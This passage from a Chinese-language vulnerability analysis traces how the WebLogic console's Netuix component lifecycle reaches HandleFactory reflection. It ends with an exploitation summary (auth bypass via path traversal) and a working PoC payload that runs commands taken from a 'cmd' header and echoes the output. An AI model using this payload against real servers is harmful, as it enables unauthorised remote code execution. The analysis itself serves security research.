    raiseChangeEvents()
    preRender() 
    saveState()
    render()  
    dispose() 
其中的方法与上面所看到的`inbound`与`outbound`相同。这些方法在节点间是以深度优先的方式执行，即按照顺序会执行所有控件的`init()`，之后才会重新遍历执行`loadState()`方法。
在说完了每个控件的生命周期后，再来说一下控件间的关系：
根据这张表我们来对应看一下`consolejndi.portal`：
红框所标注的区域是完美符合上表所描述的关系的。向上寻找`Portlet`，看加载了哪些外部控件：
跟进该文件：
这里调用了`strutsContent`控件，同时标注了具体的`action`为`MessagesAction`。可以通过该`action`在`struts-config.xml`中找到其所对应的类：
##### 2.2.4 总结
通过上面的分析，可以看到`Netuix`将执行流从模板渲染转换到其各个组件的渲染之中。所以最终触发代码执行的只和组件的生命周期有关，即只和节点有关。
在经过分析后，我列举三个最通用的组件：
  * `strutsConent`
  * `Page`
  * `Portlet`
由于无论`postback`为何值，最终都会执行`outbound`流程，所以接下来对于组件生命周期的分析，我都以`outbound`流程来说明。
#### 2.3 条条大路通罗马——HandleFactory完成代码执行
根据上面的分析，`outbound`的生命周期为：
    preRender() 
    saveState()
    render()
所以首先执行的方法是`preRender`，跟进看一下`com.bea.netuix.nf.ControlTreeWalker#walk`：
`ControlVisitor visit =
root.getVisitorForLifecycle(vt);`这里将获取`ControlLifecycle.preRenderVisitor`以深度优先的方式遍历所有节点，并调用`visit()`方法。跟进看一下`com.bea.netuix.nf.ControlVisitor#visit`：
就如上面所说，关键逻辑还是调用传入控件的`preRender()`方法。接下来就会按照2.2.3中的所介绍的控件间关系进行深度遍历，在遍历到不同组件时会利用不同的方式触发代码执行流程。
##### 2.3.1 strutsContent
以`consolejndi.portal`为例，当节点为`portletInstance`时，会触发外部组件调用，及会跟进该文件，解析`Content`节点：
此处处理的节点为`strutsContent`，即`control`为`strutsContent`。跟进`com.bea.netuix.servlets.controls.content.StrutsContent#preRender`方法：
没有相关的方法，跟进其父类`com.bea.netuix.servlets.controls.content.NetuiContent#preRender`：
`this.getScopedContentStub()`调用栈如下：
    com.bea.netuix.servlets.controls.content.StrutsContent#getScopedContentStub ->
    com.bea.netuix.servlets.controls.content.StrutsContent.StrutsContentUrlRewriter初始化 ->
    com.bea.portlet.adapter.scopedcontent.AdapterFactory#getInstance(com.bea.struts.adapter.util.rewriter.StrutsURLRewriter)
最终通过适配工厂返回一个`StrutsStubImpl`：
所以跟进`com.bea.portlet.adapter.scopedcontent.StrutsStubImpl#render`：
在`renderInternal()`方法中，完成内部渲染的工作，包括：
  * 初始化`Action`及其servlet，并设置解析器，最终调用`executeAction`执行
  * 初始化并设置请求监听器，完成请求接收
跟进`executeAction()`方法：
这里会调用`PageFlowUtils#strutsLookup`方法，该方法最终将会触发`负责处理针对`Action`请求的servlet的doGet方法`，调用链如下：
    com.bea.portlet.adapter.scopedcontent.framework.PageFlowUtils#strutsLookup
        com.bea.portlet.adapter.scopedcontent.framework.PageFlowUtils#getInstance
        com.bea.portlet.adapter.scopedcontent.framework.PageFlowUtils#instantiateStrutsDelegate
    com.bea.portlet.adapter.scopedcontent.framework.internal.PageFlowUtilsBeehiveDelegate#strutsLookupInternal
    org.apache.beehive.netui.pageflow.PageFlowUtils#strutsLookup(javax.servlet.ServletContext, javax.servlet.ServletRequest, javax.servlet.http.HttpServletResponse, java.lang.String, java.lang.String[])
    org.apache.beehive.netui.pageflow.PageFlowUtils#strutsLookup(javax.servlet.ServletContext, javax.servlet.ServletRequest, javax.servlet.http.HttpServletResponse, java.lang.String, java.lang.String[], boolean)
这里有两个点需要注意，第一个点是获取`ActionServlet`的过程，这一部分其实并不需要去跟踪代码，可以通过直接看`web.xml`找到：
关于`AsyncInitServlet`的初始化流程在2.1.1中有详细的跟踪，这里就不赘述了。这里可以看出真正的处理逻辑在`com.bea.console.internal.ConsoleActionServlet`中，直接跟进看`com.bea.console.internal.ConsoleActionServlet#doGet`:
一路向下跟进，调用栈如下：
    org.apache.struts.action.ActionServlet#process ->
    com.bea.console.internal.ConsoleActionServlet#process ->
    org.apache.beehive.netui.pageflow.PageFlowActionServlet#process ->
    org.apache.beehive.netui.pageflow.AutoRegisterActionServlet#process ->
    org.apache.beehive.netui.pageflow.PageFlowRequestProcessor#process ->
    org.apache.beehive.netui.pageflow.PageFlowRequestProcessor#processInternal ->
    org.apache.struts.action.RequestProcessor#process ->
    com.bea.console.internal.ConsolePageFlowRequestProcessor#processActionPerform ->
    com.bea.console.utils.HandleUtils#getHandleContextFromRequest ->
    com.bea.console.utils.HandleUtils#handleFromQueryString
重点看一下`com.bea.console.utils.HandleUtils#handleFromQueryString`：
首先会将请求的参数进行解析，并映射到Map中，之后遍历所有的参数，当参数以`handle`结尾，则将其转换为`Handle`类型的对象。所以跟踪流程到`com.bea.console.handles.HandleConverter#convert`：
这里会将请求中以`handle`结尾的参数值作为`local`，直接传入`HandleFactory.getHandle()`方法中，在该方法中将传入的参数值进行处理，直接完成反射实例化操作：
##### 2.3.2 page
当解析`Page`组件时，`control.preRender()`实际将会调用`com.bea.netuix.servlets.controls.page.Page#preRender`：
接下来就是一路向上，调用父类的`preRender`方法，调用栈如下：
    com.bea.netuix.servlets.controls.page.Page#preRender ->
    com.bea.netuix.servlets.controls.window.Window#preRender ->
    com.bea.netuix.servlets.controls.AdministeredBackableControl#preRender ->
    com.bea.netuix.servlets.controls.Backable.Impl#preRender
在`com.bea.netuix.servlets.controls.Backable.Impl#preRender`中将会获取`jspbacking`，并调用其`preRender`方法：
以`consolejndi.portal`为例，其中的一个`page`组件描述如下：
此处会根据`book`组件中所定义的`title`获取其`backingFile`的具体引用，在这里为`com.bea.console.utils.JndiViewerBackingFile`：
接下来的调用栈为：
    com.bea.console.utils.GeneralBackingFile#preRender ->
    com.bea.console.utils.GeneralBackingFile#localizeTitle(com.bea.netuix.servlets.controls.window.backing.WindowBackingContext, javax.servlet.http.HttpServletRequest) ->
    com.bea.console.utils.GeneralBackingFile#getDisplayName ->
    com.bea.console.utils.HandleUtils#getHandleContextFromRequest
调用至此已经和2.3.1中提到的调用路径相同了，在此不再赘述。
##### 2.3.3 portlet
`portlet`组件执行流与`page`组件基本完全相同，唯一区别点在于`backingFile`不同。以`consolejndi.portal`为例：
引用外部组件，跟进`jnditree.portlet`：
跟进看一下：
调用父类`com.bea.console.utils.PortletBackingFile#preRender`，同样，都会调用父类的`localizeTitle()`方法：
这里也会调用`com.bea.console.utils.GeneralBackingFile#localizeTitle`，之后的流程与2.3.2中的流程完全相同。
##### 2.3.4 总结
根据以上分析，我们可以看到除了`strutsContent`外，其他几种组件的应用方式都比较类似，关键点为两个：
  * 组件的`preRender`流程中会调用到`Backable#preRender`方法
  * `backingFile`为`GeneralBackingFile`子类，同时其`preRender`方法会调用父类`localizeTitle`方法
想要寻找其他的组件可以看一下继承树：
红框所标注的即为2.3.2与2.3.3中所分析到的调用过程。
### 0x03 漏洞利用
经过0x02的分析，我们不难看出该漏洞和其他传统的越权漏洞是有很大区别的：
  1. 所谓的认证绕过是通过请求原本无需认证的资源路径
  2. 在1的基础上利用`../`造成目录穿越，使`Netuix`在初始化语法树时读取对应的后台模板文件
  3. 在`Netuix`生命周期中通过组件对应的处理流程触发`Handle`流程
  4. 组件处理流程中会将请求中以`handle`结尾的参数的值作为参数传入`HandleFactory#getHandle`方法中，完成反射调用
所以利用方式也显而易见，这里利用@77ca1k1k1的poc做展示：
poc：
    com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')
### 0x04 Reference
[@77ca1k1k1关于回显的研究](https://mp.weixin.qq.com/s/u8cZEcku-uIbGAVAcos5Tw)
* * *